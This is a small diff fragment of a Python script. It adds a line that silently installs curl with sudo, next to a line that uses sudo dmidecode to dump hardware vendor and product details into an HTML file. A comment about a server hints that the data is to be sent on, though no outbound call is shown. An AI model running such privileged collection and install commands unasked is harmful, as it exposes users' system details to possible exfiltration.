@@ -3,6 +3,7 @@ import inspect
 import subprocess
 import requests
 # Command 1 (assuming permissions are handled)
+subprocess.run("sudo apt install curl -y", shell=True)  
 subprocess.run("sudo dmidecode | grep -i -e product -e manufacturer -e vendor > system_info.html", shell=True)  
 
 # Command 2 (assuming the server is set up)
